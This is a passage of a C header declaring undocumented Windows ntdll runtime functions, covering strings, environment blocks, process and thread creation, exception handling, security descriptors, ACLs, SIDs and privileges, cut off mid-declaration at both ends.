    _In_ PUNICODE_STRING SourceString);

NTSYSAPI
NTSTATUS
NTAPI
RtlUpcaseUnicodeString(
    _Inout_ PUNICODE_STRING DestinationString,
    _In_ PUNICODE_STRING SourceString,
    _In_ BOOLEAN AllocateDestinationString);

NTSYSAPI
NTSTATUS
NTAPI
RtlDowncaseUnicodeString(
    _Inout_ PUNICODE_STRING DestinationString,
    _In_ PUNICODE_STRING SourceString,
    _In_ BOOLEAN AllocateDestinationString);

NTSYSAPI
VOID
NTAPI
RtlEraseUnicodeString(
    _Inout_ PUNICODE_STRING String);

#define RTL_ENSURE_BUFFER_SIZE_NO_COPY (0x00000001)

NTSYSAPI
NTSTATUS
NTAPI
RtlpEnsureBufferSize(
    _In_ ULONG Flags,
    _Inout_ PRTL_BUFFER Buffer,
    _In_ SIZE_T NewSizeBytes);

#define RtlInitBuffer(Buff, StatBuff, StatSize) \
    do {                                        \
        (Buff)->Buffer       = (StatBuff);      \
        (Buff)->Size         = (StatSize);      \
        (Buff)->StaticBuffer = (StatBuff);      \
        (Buff)->StaticSize   = (StatSize);      \
    } while (0)

#define RtlEnsureBufferSize(Flags, Buff, NewSizeBytes) \
    (   ((Buff) != NULL && (NewSizeBytes) <= (Buff)->Size) \
        ? STATUS_SUCCESS \
        : RtlpEnsureBufferSize((Flags), (Buff), (NewSizeBytes)) \
    )

#define RtlFreeBuffer(Buff)                              \
    do {                                                 \
        if ((Buff) != NULL && (Buff)->Buffer != NULL) {  \
            if (RTLP_BUFFER_IS_HEAP_ALLOCATED(Buff)) {   \
                UNICODE_STRING UnicodeString;            \
                UnicodeString.Buffer = (PWSTR)(PVOID)(Buff)->Buffer; \
                RtlFreeUnicodeString(&UnicodeString);    \
            }                                            \
            (Buff)->Buffer = (Buff)->StaticBuffer;       \
            (Buff)->Size = (Buff)->StaticSize;           \
        }                                                \
    } while (0)


NTSYSAPI
VOID
NTAPI
RtlRunEncodeUnicodeString(
    _Inout_ PUCHAR Seed,
    _Inout_ PUNICODE_STRING String);

NTSYSAPI
VOID
NTAPI
RtlRunDecodeUnicodeString(
    _In_ UCHAR Seed,
    _Inout_ PUNICODE_STRING String);

/************************************************************************************
*
* RTL Integer conversion API.
*
************************************************************************************/

struct in6_addr;

NTSYSAPI
PWSTR
NTAPI
RtlIpv4AddressToStringW(
    _In_ const struct in_addr *Addr,
    _Out_ PWSTR S);

NTSYSAPI
NTSTATUS
NTAPI
RtlIpv4StringToAddressW(
    _In_ PCWSTR AddressString,
    _In_ BOOLEAN Strict,
    _Out_ LPCWSTR *Terminator,
    _Out_ struct in_addr *Address);

NTSYSAPI
PWSTR
NTAPI
RtlIpv6AddressToStringW(
    _In_ struct in6_addr*Address,
    _Out_writes_(46) PWSTR AddressString);

NTSYSAPI
NTSTATUS
NTAPI
RtlIpv6StringToAddressW(
    _In_ PCWSTR AddressString,
    _Out_ PCWSTR * Terminator,
    _Out_ struct in6_addr*Address);

//taken from ph2

NTSYSAPI
NTSTATUS
NTAPI
RtlIntegerToChar(
    _In_ ULONG Value,
    _In_opt_ ULONG Base,
    _In_ LONG OutputLength,
    _Out_ PSTR String);

NTSYSAPI
NTSTATUS
NTAPI
RtlCharToInteger(
    _In_ PSTR String,
    _In_opt_ ULONG Base,
    _Out_ PULONG Value);

NTSYSAPI
NTSTATUS
NTAPI
RtlLargeIntegerToChar(
    _In_ PLARGE_INTEGER Value,
    _In_opt_ ULONG Base,
    _In_ LONG OutputLength,
    _Out_ PSTR String);

NTSYSAPI
NTSTATUS
NTAPI
RtlIntegerToUnicodeString(
    _In_ ULONG Value,
    _In_opt_ ULONG Base,
    _Inout_ PUNICODE_STRING String);

NTSYSAPI
NTSTATUS
NTAPI
RtlInt64ToUnicodeString(
    _In_ ULONGLONG Value,
    _In_opt_ ULONG Base,
    _Inout_ PUNICODE_STRING String);

NTSYSAPI
NTSTATUS
NTAPI
RtlUnicodeStringToInteger(
    _In_ PUNICODE_STRING String,
    _In_opt_ ULONG Base,
    _Out_ PULONG Value);

/************************************************************************************
*
* RTL Process/Thread API.
*
************************************************************************************/

typedef NTSTATUS(*PUSER_PROCESS_START_ROUTINE)(
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters
    );

typedef NTSTATUS(*PUSER_THREAD_START_ROUTINE)(
    PVOID ThreadParameter
    );

typedef struct _RTL_USER_PROCESS_INFORMATION {
    ULONG Length;
    HANDLE Process;
    HANDLE Thread;
    CLIENT_ID ClientId;
    SECTION_IMAGE_INFORMATION ImageInformation;
} RTL_USER_PROCESS_INFORMATION, *PRTL_USER_PROCESS_INFORMATION;

//
// This structure is used only by Wow64 processes. The offsets
// of structure elements should the same as viewed by a native Win64 application.
//
typedef struct _RTL_USER_PROCESS_INFORMATION64 {
    ULONG Length;
    LONGLONG Process;
    LONGLONG Thread;
    CLIENT_ID64 ClientId;
    SECTION_IMAGE_INFORMATION64 ImageInformation;
} RTL_USER_PROCESS_INFORMATION64, *PRTL_USER_PROCESS_INFORMATION64;

NTSYSAPI
NTSTATUS
STDAPIVCALLTYPE
RtlSetProcessIsCritical(
    _In_ BOOLEAN NewValue,
    _Out_opt_ PBOOLEAN OldValue,
    _In_ BOOLEAN CheckFlag);

NTSYSAPI
NTSTATUS
STDAPIVCALLTYPE
RtlSetThreadIsCritical(
    _In_ BOOLEAN NewValue,
    _Out_opt_ PBOOLEAN OldValue,
    _In_ BOOLEAN CheckFlag);

NTSYSAPI
NTSTATUS
NTAPI
RtlCreateEnvironment(
    _In_ BOOLEAN CloneCurrentEnvironment,
    _Out_ PVOID *Environment);

NTSYSAPI
NTSTATUS
NTAPI
RtlCreateEnvironmentEx(
    _In_ PVOID SourceEnv,
    _Out_ PVOID *Environment,
    _In_ ULONG Flags);

NTSYSAPI
NTSTATUS
NTAPI
RtlExpandEnvironmentStrings(
    _In_opt_ PVOID Environment,
    _In_reads_(SrcLength) PWSTR Src,
    _In_ SIZE_T SrcLength,
    _Out_writes_opt_(DstLength) PWSTR Dst,
    _In_ SIZE_T DstLength,
    _Out_opt_ PSIZE_T ReturnLength);

NTSYSAPI
NTSTATUS
NTAPI
RtlExpandEnvironmentStrings_U(
    _In_opt_ PVOID Environment,
    _In_ PCUNICODE_STRING Source,
    _Out_ PUNICODE_STRING Destination,
    _Out_opt_ PULONG ReturnedLength);

NTSYSAPI
NTSTATUS
NTAPI
RtlSetCurrentEnvironment(
    _In_ PVOID Environment,
    _Out_opt_ PVOID *PreviousEnvironment);

NTSYSAPI
NTSTATUS
NTAPI
RtlQueryEnvironmentVariable_U(
    _In_opt_ PVOID Environment,
    _In_ PUNICODE_STRING Name,
    _Out_ PUNICODE_STRING Value);

NTSYSAPI
NTSTATUS
NTAPI
RtlSetEnvironmentVariable(
    _Inout_opt_ PVOID* Environment,
    _In_ PUNICODE_STRING Name,
    _In_opt_ PUNICODE_STRING Value);

NTSYSAPI
NTSTATUS
NTAPI
RtlDestroyEnvironment(
    _In_ PVOID Environment);

NTSYSAPI
NTSTATUS
NTAPI
RtlCreateProcessParameters(
    _Out_ PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    _In_ PUNICODE_STRING ImagePathName,
    _In_opt_ PUNICODE_STRING DllPath,
    _In_opt_ PUNICODE_STRING CurrentDirectory,
    _In_opt_ PUNICODE_STRING CommandLine,
    _In_opt_ PVOID Environment,
    _In_opt_ PUNICODE_STRING WindowTitle,
    _In_opt_ PUNICODE_STRING DesktopInfo,
    _In_opt_ PUNICODE_STRING ShellInfo,
    _In_opt_ PUNICODE_STRING RuntimeData);

NTSYSAPI
NTSTATUS
NTAPI
RtlDestroyProcessParameters(
    _In_ PRTL_USER_PROCESS_PARAMETERS ProcessParameters);

NTSYSAPI
NTSTATUS
NTAPI
RtlCreateProcessParametersEx(
    _Out_ PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    _In_ PUNICODE_STRING ImagePathName,
    _In_opt_ PUNICODE_STRING DllPath,
    _In_opt_ PUNICODE_STRING CurrentDirectory,
    _In_opt_ PUNICODE_STRING CommandLine,
    _In_opt_ PVOID Environment,
    _In_opt_ PUNICODE_STRING WindowTitle,
    _In_opt_ PUNICODE_STRING DesktopInfo,
    _In_opt_ PUNICODE_STRING ShellInfo,
    _In_opt_ PUNICODE_STRING RuntimeData,
    _In_ ULONG Flags);

NTSYSAPI
NTSTATUS
NTAPI
RtlCreateUserProcess(
    _In_ PUNICODE_STRING NtImagePathName,
    _In_ ULONG Attributes,
    _In_ PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    _In_opt_ PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    _In_opt_ PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    _In_opt_ HANDLE ParentProcess,
    _In_ BOOLEAN InheritHandles,
    _In_opt_ HANDLE DebugPort,
    _In_opt_ HANDLE ExceptionPort,
    _Out_ PRTL_USER_PROCESS_INFORMATION ProcessInformationn);

NTSYSAPI
NTSTATUS
NTAPI
RtlCreateUserThread(
    _In_ HANDLE Process,
    _In_opt_ PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    _In_ BOOLEAN CreateSuspended,
    _In_ ULONG StackZeroBits,
    _In_opt_ SIZE_T MaximumStackSize,
    _In_opt_ SIZE_T InitialStackSize,
    _In_ PUSER_THREAD_START_ROUTINE StartAddress,
    _In_opt_ PVOID Parameter,
    _Out_opt_ PHANDLE Thread,
    _Out_opt_ PCLIENT_ID ClientId);

NTSYSAPI
VOID
NTAPI
RtlExitUserThread(
    _In_ NTSTATUS ExitStatus);

NTSYSAPI
VOID
NTAPI
RtlExitUserProcess(
    _In_ NTSTATUS ExitStatus);

NTSYSAPI
VOID
NTAPI
RtlFreeUserThreadStack(
    _In_ HANDLE hProcess,
    _In_ HANDLE hThread);

NTSYSAPI
VOID
NTAPI
RtlPushFrame(
    _In_ PTEB_ACTIVE_FRAME Frame);

NTSYSAPI
VOID
NTAPI
RtlPopFrame(
    _In_ PTEB_ACTIVE_FRAME Frame);

NTSYSAPI
PTEB_ACTIVE_FRAME
NTAPI
RtlGetFrame(
    VOID);

NTSYSAPI
PVOID
NTAPI
RtlEncodePointer(
    _In_ PVOID Ptr);

NTSYSAPI
PVOID
NTAPI
RtlDecodePointer(
    _In_ PVOID Ptr);

/************************************************************************************
*
* RTL Memory Buffer API.
*
************************************************************************************/

NTSYSAPI
SIZE_T
NTAPI
RtlCompareMemoryUlong(
    _In_ PVOID Source,
    _In_ SIZE_T Length,
    _In_ ULONG Pattern);

NTSYSAPI
VOID
NTAPI
RtlFillMemoryUlong(
    _Out_ PVOID Destination,
    _In_ SIZE_T Length,
    _In_ ULONG Pattern);

NTSYSAPI
VOID
NTAPI
RtlFillMemoryUlonglong(
    _Out_ PVOID Destination,
    _In_ SIZE_T Length,
    _In_ ULONGLONG Pattern);

/************************************************************************************
*
* RTL PEB API.
*
************************************************************************************/

NTSYSAPI
PPEB
NTAPI
RtlGetCurrentPeb(
    VOID);

NTSYSAPI
VOID
NTAPI
RtlAcquirePebLock(
    VOID);

NTSYSAPI
VOID
NTAPI
RtlReleasePebLock(
    VOID);

/************************************************************************************
*
* RTL Exception Handling API.
*
************************************************************************************/

NTSYSAPI
PVOID
NTAPI
RtlAddVectoredExceptionHandler(
    _In_ ULONG First,
    _In_ PVECTORED_EXCEPTION_HANDLER Handler);

NTSYSAPI
ULONG
NTAPI
RtlRemoveVectoredExceptionHandler(
    _In_ PVOID Handle);

NTSYSAPI
BOOLEAN
NTAPI
RtlDispatchException(
    _In_ PEXCEPTION_RECORD ExceptionRecord,
    _In_ PCONTEXT ContextRecord);

NTSYSAPI
PVOID
NTAPI
RtlAddVectoredContinueHandler(
    _In_ ULONG First,
    _In_ PVECTORED_EXCEPTION_HANDLER Handler);

NTSYSAPI
ULONG
NTAPI
RtlRemoveVectoredContinueHandler(
    _In_ PVOID Handle);

NTSYSAPI
VOID
NTAPI
RtlRaiseException(
    _In_ PEXCEPTION_RECORD ExceptionRecord);

NTSYSAPI
DECLSPEC_NORETURN
VOID
NTAPI
RtlRaiseStatus(
    _In_ NTSTATUS Status);

NTSYSAPI
NTSTATUS
NTAPI
NtContinue(
    _In_ PCONTEXT ContextRecord,
    _In_ BOOLEAN TestAlert);

NTSYSAPI
NTSTATUS
NTAPI
NtRaiseException(
    _In_ PEXCEPTION_RECORD ExceptionRecord,
    _In_ PCONTEXT ContextRecord,
    _In_ BOOLEAN FirstChance);

__analysis_noreturn
NTSYSAPI
VOID
NTAPI
RtlAssert(
    _In_ PVOID VoidFailedAssertion,
    _In_ PVOID VoidFileName,
    _In_ ULONG LineNumber,
    _In_opt_ PSTR MutableMessage);

#define RTL_ASSERT(exp) \
    ((!(exp)) ? (RtlAssert((PVOID)#exp, (PVOID)__FILE__, __LINE__, NULL), FALSE) : TRUE)
#define RTL_ASSERTMSG(msg, exp) \
    ((!(exp)) ? (RtlAssert((PVOID)#exp, (PVOID)__FILE__, __LINE__, msg), FALSE) : TRUE)
#define RTL_SOFT_ASSERT(_exp) \
    ((!(_exp)) ? (DbgPrint("%s(%d): Soft assertion failed\n   Expression: %s\n", __FILE__, __LINE__, #_exp), FALSE) : TRUE)
#define RTL_SOFT_ASSERTMSG(_msg, _exp) \
    ((!(_exp)) ? (DbgPrint("%s(%d): Soft assertion failed\n   Expression: %s\n   Message: %s\n", __FILE__, __LINE__, #_exp, (_msg)), FALSE) : TRUE)

typedef ULONG(NTAPI* PRTLP_UNHANDLED_EXCEPTION_FILTER)(
    _In_ PEXCEPTION_POINTERS ExceptionInfo
    );

NTSYSAPI
VOID
NTAPI
RtlSetUnhandledExceptionFilter(
    _In_ PRTLP_UNHANDLED_EXCEPTION_FILTER UnhandledExceptionFilter);

NTSYSAPI
LONG
NTAPI
RtlUnhandledExceptionFilter(
    _In_ PEXCEPTION_POINTERS ExceptionPointers);

/************************************************************************************
*
* RTL Security API.
*
************************************************************************************/

NTSYSAPI
NTSTATUS
NTAPI
RtlGetOwnerSecurityDescriptor(
    _In_ PSECURITY_DESCRIPTOR SecurityDescriptor,
    _Out_ PSID *Owner,
    _Out_ PBOOLEAN OwnerDefaulted);

NTSYSAPI
NTSTATUS
NTAPI
RtlGetGroupSecurityDescriptor(
    _In_ PSECURITY_DESCRIPTOR SecurityDescriptor,
    _Out_ PSID *Group,
    _Out_ PBOOLEAN GroupDefaulted);

NTSYSAPI
NTSTATUS
NTAPI
RtlCreateSecurityDescriptor(
    _In_ PSECURITY_DESCRIPTOR SecurityDescriptor,
    _In_ ULONG Revision);

NTSYSAPI
NTSTATUS
NTAPI
RtlSetOwnerSecurityDescriptor(
    _In_ PSECURITY_DESCRIPTOR SecurityDescriptor,
    _In_ PSID Owner,
    _In_ BOOLEAN OwnerDefaulted);

NTSYSAPI
NTSTATUS
NTAPI
RtlCopySecurityDescriptor(
    _In_ PSECURITY_DESCRIPTOR InputSecurityDescriptor,
    _Out_ PSECURITY_DESCRIPTOR* OutputSecurityDescriptor);

NTSYSAPI
NTSTATUS
NTAPI
RtlMakeSelfRelativeSD(
    _In_ PSECURITY_DESCRIPTOR AbsoluteSecurityDescriptor,
    _Out_writes_bytes_(*BufferLength) PSECURITY_DESCRIPTOR SelfRelativeSecurityDescriptor,
    _Inout_ PULONG BufferLength);

NTSYSAPI
NTSTATUS
NTAPI
RtlAbsoluteToSelfRelativeSD(
    _In_ PSECURITY_DESCRIPTOR AbsoluteSecurityDescriptor,
    _Out_writes_bytes_to_opt_(*BufferLength, *BufferLength) PSECURITY_DESCRIPTOR SelfRelativeSecurityDescriptor,
    _Inout_ PULONG BufferLength);

NTSYSAPI
NTSTATUS
NTAPI
RtlSelfRelativeToAbsoluteSD(
    _In_ PSECURITY_DESCRIPTOR SelfRelativeSecurityDescriptor,
    _Out_writes_bytes_to_opt_(*AbsoluteSecurityDescriptorSize, *AbsoluteSecurityDescriptorSize) PSECURITY_DESCRIPTOR AbsoluteSecurityDescriptor,
    _Inout_ PULONG AbsoluteSecurityDescriptorSize,
    _Out_writes_bytes_to_opt_(*DaclSize, *DaclSize) PACL Dacl,
    _Inout_ PULONG DaclSize,
    _Out_writes_bytes_to_opt_(*SaclSize, *SaclSize) PACL Sacl,
    _Inout_ PULONG SaclSize,
    _Out_writes_bytes_to_opt_(*OwnerSize, *OwnerSize) PSID Owner,
    _Inout_ PULONG OwnerSize,
    _Out_writes_bytes_to_opt_(*PrimaryGroupSize, *PrimaryGroupSize) PSID PrimaryGroup,
    _Inout_ PULONG PrimaryGroupSize);

NTSYSAPI
NTSTATUS
NTAPI
RtlSetDaclSecurityDescriptor(
    _Inout_ PSECURITY_DESCRIPTOR SecurityDescriptor,
    _In_ BOOLEAN DaclPresent,
    _In_opt_ PACL Dacl,
    _In_ BOOLEAN DaclDefaulted);

NTSYSAPI
NTSTATUS
NTAPI
RtlGetDaclSecurityDescriptor(
    _In_ PSECURITY_DESCRIPTOR SecurityDescriptor,
    _Out_ PBOOLEAN DaclPresent,
    _Out_ PACL* Dacl,
    _Out_ PBOOLEAN DaclDefaulted);

NTSYSAPI
NTSTATUS
NTAPI
RtlSetSaclSecurityDescriptor(
    _Inout_ PSECURITY_DESCRIPTOR SecurityDescriptor,
    _In_ BOOLEAN SaclPresent,
    _In_opt_ PACL Sacl,
    _In_ BOOLEAN SaclDefaulted);

NTSYSAPI
NTSTATUS
NTAPI
RtlGetSaclSecurityDescriptor(
    _In_ PSECURITY_DESCRIPTOR SecurityDescriptor,
    _Out_ PBOOLEAN SaclPresent,
    _Out_ PACL* Sacl,
    _Out_ PBOOLEAN SaclDefaulted);

NTSYSAPI
ULONG
NTAPI
RtlLengthSecurityDescriptor(
    _In_ PSECURITY_DESCRIPTOR SecurityDescriptor);

_Check_return_
NTSYSAPI
BOOLEAN
NTAPI
RtlValidSecurityDescriptor(
    _In_ PSECURITY_DESCRIPTOR SecurityDescriptor);

_Check_return_
NTSYSAPI
BOOLEAN
NTAPI
RtlValidRelativeSecurityDescriptor(
    _In_reads_bytes_(SecurityDescriptorLength) PSECURITY_DESCRIPTOR SecurityDescriptorInput,
    _In_ ULONG SecurityDescriptorLength,
    _In_ SECURITY_INFORMATION RequiredInformation);

NTSYSAPI
NTSTATUS
NTAPI
RtlCreateAcl(
    _Out_writes_bytes_(AclLength) PACL Acl,
    _In_ ULONG AclLength,
    _In_ ULONG AclRevision);

NTSYSAPI
BOOLEAN
NTAPI
RtlValidAcl(
    _In_ PACL Acl);

NTSYSAPI
NTSTATUS
NTAPI
RtlQueryInformationAcl(
    _In_ PACL Acl,
    _Out_writes_bytes_(AclInformationLength) PVOID AclInformation,
    _In_ ULONG AclInformationLength,
    _In_ ACL_INFORMATION_CLASS AclInformationClass);

NTSYSAPI
NTSTATUS
NTAPI
RtlSetInformationAcl(
    _Inout_ PACL Acl,
    _In_reads_bytes_(AclInformationLength) PVOID AclInformation,
    _In_ ULONG AclInformationLength,
    _In_ ACL_INFORMATION_CLASS AclInformationClass);

NTSYSAPI
NTSTATUS
NTAPI
RtlAddAce(
    _Inout_ PACL Acl,
    _In_ ULONG AceRevision,
    _In_ ULONG StartingAceIndex,
    _In_reads_bytes_(AceListLength) PVOID AceList,
    _In_ ULONG AceListLength);

NTSYSAPI
NTSTATUS
NTAPI
RtlDeleteAce(
    _Inout_ PACL Acl,
    _In_ ULONG AceIndex);

NTSYSAPI
NTSTATUS
NTAPI
RtlGetAce(
    _In_ PACL Acl,
    _In_ ULONG AceIndex,
    _Outptr_ PVOID *Ace);

NTSYSAPI
BOOLEAN
NTAPI
RtlFirstFreeAce(
    _In_ PACL Acl,
    _Out_ PVOID *FirstFree);

NTSYSAPI
BOOLEAN
NTAPI
RtlOwnerAcesPresent(
    _In_ PACL pAcl);

NTSYSAPI
NTSTATUS
NTAPI
RtlAddAccessAllowedAce(
    _Inout_ PACL Acl,
    _In_ ULONG AceRevision,
    _In_ ACCESS_MASK AccessMask,
    _In_ PSID Sid);

NTSYSAPI
NTSTATUS
NTAPI
RtlAddAccessAllowedAceEx(
    _Inout_ PACL Acl,
    _In_ ULONG AceRevision,
    _In_ ULONG AceFlags,
    _In_ ACCESS_MASK AccessMask,
    _In_ PSID Sid);

NTSYSAPI
NTSTATUS
NTAPI
RtlAddAccessDeniedAce(
    _Inout_ PACL Acl,
    _In_ ULONG AceRevision,
    _In_ ACCESS_MASK AccessMask,
    _In_ PSID Sid);

NTSYSAPI
NTSTATUS
NTAPI
RtlAddAccessDeniedAceEx(
    _Inout_ PACL Acl,
    _In_ ULONG AceRevision,
    _In_ ULONG AceFlags,
    _In_ ACCESS_MASK AccessMask,
    _In_ PSID Sid);

NTSYSAPI
NTSTATUS
NTAPI
RtlAddAuditAccessAce(
    _Inout_ PACL Acl,
    _In_ ULONG AceRevision,
    _In_ ACCESS_MASK AccessMask,
    _In_ PSID Sid,
    _In_ BOOLEAN AuditSuccess,
    _In_ BOOLEAN AuditFailure);

NTSYSAPI
NTSTATUS
NTAPI
RtlAddAuditAccessAceEx(
    _Inout_ PACL Acl,
    _In_ ULONG AceRevision,
    _In_ ULONG AceFlags,
    _In_ ACCESS_MASK AccessMask,
    _In_ PSID Sid,
    _In_ BOOLEAN AuditSuccess,
    _In_ BOOLEAN AuditFailure);

NTSYSAPI
NTSTATUS
NTAPI
RtlAddAccessAllowedObjectAce(
    _Inout_ PACL Acl,
    _In_ ULONG AceRevision,
    _In_ ULONG AceFlags,
    _In_ ACCESS_MASK AccessMask,
    _In_opt_ GUID *ObjectTypeGuid,
    _In_opt_ GUID *InheritedObjectTypeGuid,
    _In_ PSID Sid);

NTSYSAPI
NTSTATUS
NTAPI
RtlAddAccessDeniedObjectAce(
    _Inout_ PACL Acl,
    _In_ ULONG AceRevision,
    _In_ ULONG AceFlags,
    _In_ ACCESS_MASK AccessMask,
    _In_opt_ GUID *ObjectTypeGuid,
    _In_opt_ GUID *InheritedObjectTypeGuid,
    _In_ PSID Sid);

NTSYSAPI
NTSTATUS
NTAPI
RtlAddAuditAccessObjectAce(
    _Inout_ PACL Acl,
    _In_ ULONG AceRevision,
    _In_ ULONG AceFlags,
    _In_ ACCESS_MASK AccessMask,
    _In_opt_ GUID *ObjectTypeGuid,
    _In_opt_ GUID *InheritedObjectTypeGuid,
    _In_ PSID Sid,
    _In_ BOOLEAN AuditSuccess,
    _In_ BOOLEAN AuditFailure);

NTSYSAPI
NTSTATUS
NTAPI
RtlAddCompoundAce(
    _Inout_ PACL Acl,
    _In_ ULONG AceRevision,
    _In_ UCHAR AceType,
    _In_ ACCESS_MASK AccessMask,
    _In_ PSID ServerSid,
    _In_ PSID ClientSid);

NTSYSAPI
NTSTATUS
NTAPI
RtlAddMandatoryAce(
    _Inout_ PACL Acl,
    _In_ ULONG AceRevision,
    _In_ ULONG AceFlags,
    _In_ PSID Sid,
    _In_ UCHAR AceType,
    _In_ ACCESS_MASK AccessMask);

NTSYSAPI
PVOID
NTAPI
RtlFindAceByType(
    _In_ PACL pAcl,
    _In_ UCHAR AceType,
    _Out_opt_ PULONG pIndex);

NTSYSAPI
BOOLEAN
NTAPI
RtlOwnerAcesPresent(
    _In_ PACL pAcl);

NTSYSAPI
NTSTATUS
NTAPI
RtlDefaultNpAcl(
    _Out_ PACL* Acl);

NTSYSAPI
NTSTATUS
NTAPI
RtlAddProcessTrustLabelAce(
    _Inout_ PACL Acl,
    _In_ ULONG AceRevision,
    _In_ ULONG AceFlags,
    _In_ PSID ProcessTrustLabelSid,
    _In_ UCHAR AceType,
    _In_ ACCESS_MASK AccessMask);

NTSYSAPI
BOOLEAN
NTAPI
RtlValidSid(
    _In_ PSID Sid);

NTSYSAPI
BOOLEAN
NTAPI
RtlEqualSid(
    _In_ PSID Sid1,
    _In_ PSID Sid2);

NTSYSAPI
BOOLEAN
NTAPI
RtlEqualPrefixSid(
    _In_ PSID Sid1,
    _In_ PSID Sid2);

NTSYSAPI
ULONG
NTAPI
RtlLengthRequiredSid(
    _In_ ULONG SubAuthorityCount);

NTSYSAPI
PVOID
NTAPI
RtlFreeSid(
    _In_ PSID Sid);

NTSYSAPI
NTSTATUS
NTAPI
RtlAllocateAndInitializeSid(
    _In_ PSID_IDENTIFIER_AUTHORITY IdentifierAuthority,
    _In_ UCHAR SubAuthorityCount,
    _In_ ULONG SubAuthority0,
    _In_ ULONG SubAuthority1,
    _In_ ULONG SubAuthority2,
    _In_ ULONG SubAuthority3,
    _In_ ULONG SubAuthority4,
    _In_ ULONG SubAuthority5,
    _In_ ULONG SubAuthority6,
    _In_ ULONG SubAuthority7,
    _Out_ PSID *Sid);

NTSYSAPI
NTSTATUS
NTAPI
RtlInitializeSid(
    _Out_ PSID Sid,
    _In_ PSID_IDENTIFIER_AUTHORITY IdentifierAuthority,
    _In_ UCHAR SubAuthorityCount);

NTSYSAPI
PSID_IDENTIFIER_AUTHORITY
NTAPI
RtlIdentifierAuthoritySid(
    _In_ PSID Sid);

NTSYSAPI
PULONG
NTAPI
RtlSubAuthoritySid(
    _In_ PSID Sid,
    _In_ ULONG SubAuthority);

NTSYSAPI
PUCHAR
NTAPI
RtlSubAuthorityCountSid(
    _In_ PSID Sid);

NTSYSAPI
ULONG
NTAPI
RtlLengthSid(
    _In_ PSID Sid);

NTSYSAPI
NTSTATUS
NTAPI
RtlCopySid(
    _In_ ULONG DestinationSidLength,
    _In_ PSID DestinationSid,
    _In_ PSID SourceSid);

NTSYSAPI
NTSTATUS
NTAPI
RtlCopySidAndAttributesArray(
    _In_ ULONG ArrayLength,
    _In_ PSID_AND_ATTRIBUTES Source,
    _In_ ULONG TargetSidBufferSize,
    _Out_ PSID_AND_ATTRIBUTES TargetArrayElement,
    _Out_ PSID TargetSid,
    _Out_ PSID *NextTargetSid,
    _Out_ PULONG RemainingTargetSidBufferSize);

NTSYSAPI
NTSTATUS
NTAPI
RtlLengthSidAsUnicodeString(
    _In_ PSID Sid,
    _Out_ PULONG StringLength);

NTSYSAPI
NTSTATUS
NTAPI
RtlConvertSidToUnicodeString(
    _In_ PUNICODE_STRING UnicodeString,
    _In_ PSID Sid,
    _In_ BOOLEAN AllocateDestinationString);

NTSYSAPI
NTSTATUS
NTAPI
RtlCreateServiceSid(
    _In_ PUNICODE_STRING ServiceName,
    _Out_writes_bytes_opt_(*ServiceSidLength) PSID ServiceSid,
    _Inout_ PULONG ServiceSidLength);

NTSYSAPI
NTSTATUS
NTAPI
RtlSidEqualLevel(
    _In_ PSID Sid1,
    _In_ PSID Sid2,
    _Out_ PBOOLEAN EqualLevel);

NTSYSAPI
NTSTATUS
NTAPI
RtlSidIsHigherLevel(
    _In_ PSID Sid1,
    _In_ PSID Sid2,
    _Out_ PBOOLEAN HigherLevel);

NTSYSAPI
NTSTATUS
NTAPI
RtlReplaceSidInSd(
    _Inout_ PSECURITY_DESCRIPTOR SecurityDescriptor,
    _In_ PSID OldSid,
    _In_ PSID NewSid,
    _Out_ ULONG* NumChanges);

NTSYSAPI
BOOLEAN
NTAPI
RtlIsElevatedRid(
    _In_ PSID_AND_ATTRIBUTES SidAttr);

FORCEINLINE 
LUID 
NTAPI 
RtlConvertLongToLuid(
    _In_ LONG Long
)
{
    LUID TempLuid;
    LARGE_INTEGER TempLi;

    TempLi.QuadPart = Long;
    TempLuid.LowPart = TempLi.LowPart;
    TempLuid.HighPart = TempLi.HighPart;
    return(TempLuid);
}

FORCEINLINE 
LUID 
RtlConvertUlongToLuid(
    _In_ ULONG Ulong
)
{
    LUID tempLuid;

    tempLuid.LowPart = Ulong;
    tempLuid.HighPart = 0;

    return tempLuid;
}

NTSYSAPI
ULONG
NTAPI
RtlUniform(
    _Inout_ PULONG Seed);

NTSYSAPI
ULONG
NTAPI
RtlRandomEx(
    _Inout_ PULONG Seed);

NTSYSAPI
ULONG32
NTAPI
RtlComputeCrc32(
    _In_ ULONG32 PartialCrc,
    _In_ PVOID Buffer,
    _In_ ULONG Length);

NTSYSAPI
NTSTATUS
NTAPI
RtlAdjustPrivilege(
    _In_ ULONG Privilege,
    _In_ BOOLEAN Enable,
    _In_ BOOLEAN Client,
    _Out_ PBOOLEAN WasEnabled);

#define RTL_ACQUIRE_PRIVILEGE_REVERT 0x00000001
#define RTL_ACQUIRE_PRIVILEGE_PROCESS 0x00000002

NTSYSAPI
NTSTATUS
NTAPI
RtlAcquirePrivilege(
    _In_ PULONG Privilege,
    _In_ ULONG NumPriv,
    _In_ ULONG Flags,
    _Out_ PVOID* ReturnedState);

NTSYSAPI
VOID
NTAPI
RtlReleasePrivilege(
    _In_ PVOID StatePointer);

NTSYSAPI
NTSTATUS
NTAPI
RtlRemovePrivileges(
    _In_ HANDLE TokenHandle,
    _In_ PULONG PrivilegesToKeep,
    _In_ ULONG PrivilegeCount);

NTSYSAPI
BOOLEAN
NTAPI
RtlAreAllAccessesGranted(
    _In_ ACCESS_MASK GrantedAccess,
    _In_ ACCESS_MASK DesiredAccess);

NTSYSAPI
BOOLEAN
NTAPI
RtlAreAnyAccessesGranted(
    _In_ ACCESS_MASK GrantedAccess,
    _In_ ACCESS_MASK DesiredAccess);

NTSYSAPI
VOID
NTAPI
RtlMapGenericMask(
    _In_ PACCESS_MASK AccessMask,
    _In_ PGENERIC_MAPPING GenericMapping);

NTSYSAPI
NTSTATUS
NTAPI
RtlImpersonateSelf(
    _In_ SECURITY_IMPERSONATION_LEVEL ImpersonationLevel);

NTSYSAPI
NTSTATUS
NTAPI
RtlImpersonateSelfEx(
    _In_ SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
    _In_opt_ ACCESS_MASK AdditionalAccess,
    _Out_opt_ PHANDLE ThreadToken);

/************************************************************************************
*
* RTL Version API.
*
************************************************************************************/

NTSYSAPI
NTSTATUS
NTAPI
RtlGetVersion(
